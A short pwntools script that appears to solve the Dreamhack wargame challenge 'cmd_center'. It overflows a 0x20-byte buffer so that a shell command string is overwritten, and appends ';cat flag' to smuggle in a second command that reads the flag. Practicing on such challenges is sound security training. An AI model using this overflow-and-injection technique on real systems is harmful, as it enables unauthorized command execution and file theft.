from pwn import *

# p = process('./cmd_center')
p = remote('host3.dreamhack.games', 12167)

context.arch = 'amd64'
context.endian = 'little'
context.log_level = 'debug'

payload = b'A' * 0x20
payload += b'ifconfig'
payload += b';cat flag'

p.sendafter(b': ', payload)
print(p.recvall())
